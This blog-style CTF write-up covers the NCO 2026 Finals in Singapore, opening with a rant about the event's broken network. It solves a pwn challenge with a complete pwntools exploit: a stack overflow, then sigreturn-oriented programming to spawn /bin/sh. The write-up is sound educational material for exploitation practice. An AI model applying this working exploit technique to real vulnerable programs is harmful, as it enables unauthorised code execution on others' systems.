---
title: National Cybersecurity Olympiad 2026 Finals (Singapore) Writeups
published: 2026-03-30
description: 'The beauty of tunnel vision'
image: ''
tags: ["Ctf", "Pwn", "Web", "Forensics"]
category: 'CTF Writeups'
draft: false 
lang: ''

---

# Preamble (Rant about Infra)

Coming into NCO Finals, I expected a generally smooth-running event. Maybe a few infrastructure overloads here and there, maybe a few challenges with hiccups, the usual CTF infra pain points. What I did not expect, however, was for the infrastructure and networking setup to be down for the large majority of the time of the CTF (to the extent that the organisers had to request us to use our mobile hotspots in order to maintain internet connectivity). The CTFd was unusable half the time, as it depended on the Google Fonts API, which was inaccessible due to the frankly horrid (and should i say rather peculiarly configured) networking setup during the competition. Nontheless, despite these technical difficulties, the actual challenges were rather interesting, and I would like to share some of my solutions for a few challenges that i found interesting. I am still in the process of upsolving some other challenges; these will be updated in this article once I get round to solving them.

Recommended listening: https://music.apple.com/sg/album/o-magnum-mysterium/487123957?i=487123980 (This rendition is really cool :D)

# Pwn

## base26/encoder

> "Excellent!" I cried.
> 
> "Elementary," said [Sherlock Holmes]. "It is one of those instances where the reasoner can produce an effect which seems remarkable to his neighbor, because the latter has missed the one little point which is the basis of the
>  deduction. [...]"
> 
> ~ Sir Arthur Conan Doyle, The Adventure of the Crooked Man

I genuinely did not know what was going through my mind when I was tackling this challenge. I mistook it for a traditional ROP challenge, which cost me precious points and time during the competition time frame. Anyways, here is the challenge source:

```asm
; nasm -f elf64 chal.asm -o chal.o && ld chal.o -o chal -z noexecstack
section .data
    prompt db "Please enter a string to encode: ", 0
    len_prompt equ $ - prompt
    name_prompt db "What is your name? ", 0
    len_name_prompt equ $ - name_prompt
    newline db 10

section .bss
    out_buf resb 2      ; 2-byte buffer to hold encoded characters for printing
    username resb 64

section .text
    global _start

_start:
    ; --- What is your name? ---
    mov rax, 1
    mov rdi, 1
    mov rsi, name_prompt
    mov rdx, len_name_prompt
    syscall

    mov rax, 0
    mov rdi, 0
    mov rsi, username
    mov rdx, 64
    syscall

    call main
    ; Exit 
    mov rdi, 0
    push 60
    pop rax
    syscall
    ret

main:
    push rbp
    mov rbp, rsp
    sub rsp, 1024         ; Allocate a 1024-byte buffer on the stack

    ; Print prompt
    mov rax, 1
    mov rdi, 1
    mov rsi, prompt
    mov rdx, len_prompt
    syscall

    mov r8, rsp         ; r8 will track our current write position in the buffer

read_loop:
    mov rax, 0          ; sys_read
    mov rdi, 0          ; stdin
    mov rsi, r8         ; write directly to the current stack pointer location
    mov rdx, 1          ; read 1 byte at a time
    syscall

    ; Check for EOF or Newline (0xA)
    cmp rax, 0
    jle encode_init     ; If EOF or error, stop reading
    cmp byte [r8], 10
    je encode_init      ; If newline, stop reading

    inc r8
    jmp read_loop

encode_init:
    mov r9, rsp         ; r9 will iterate through the buffer we just read

encode_loop:
    cmp r9, r8          ; Did we reach the end of the user's input?
    je finish

    ; --- Custom Base26 Encoding ---
    movzx ax, byte [r9] ; Load the current byte into AX
    mov cl, 26
    div cl              ; Divide AX by 26. 
                        ; AL gets the quotient, AH gets the remainder.

    add al, 'a'         ; Convert quotient to 'a'-'z'
    add ah, 'a'         ; Convert remainder to 'a'-'z'

    ; Store the two Base26 characters in our output buffer
    mov [out_buf], al
    mov [out_buf+1], ah

    ; Print the 2 encoded characters
    mov rax, 1          ; sys_write
    mov rdi, 1          ; stdout
    mov rsi, out_buf
    mov rdx, 2          ; write 2 bytes
    syscall

    inc r9              ; Move to the next byte in the input buffer
    jmp encode_loop

finish:
    ; Print a newline at the very end
    mov rax, 1
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    syscall

    ; Epilogue / Cleanup
    mov rsp, rbp
    pop rbp
    ret
```

What I **should** have noticed is that there is a `pop rax; syscall; ret` gadget which allows me to control `rax`, and thus trivially setup a Sigreturn frame on the stack to do SROP. However, my brain tunnel-visioned into thinking about how to gain control of `rdi`, `rsi` and `rdx` to `exeve("/bin/sh", 0, 0)`.

We also notice that name is stored in `.bss`, and since there is no PIE on this binary, we have a nice place to put `/bin/sh\x00`.

Thus, we can just do a simple SROP setup as such:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")

context.binary = exe
context.terminal = ["zellij", "action", "new-pane", "--"]
context.gdb_binary = "/usr/bin/pwndbg"

gdbscript = """
set breakpoint pending on
b *0x401043
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    payload = b"A" * 0x408
    payload += p64(0x401042)
    payload += p64(0xf)
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = 0x000000000040203A
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = 0x0000000000401043
    payload += bytes(frame)
    r.sendlineafter(b"? ", b"/bin/sh\x00")
    r.sendlineafter(b": ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

Ah, the wonders of tunnel-visioning.
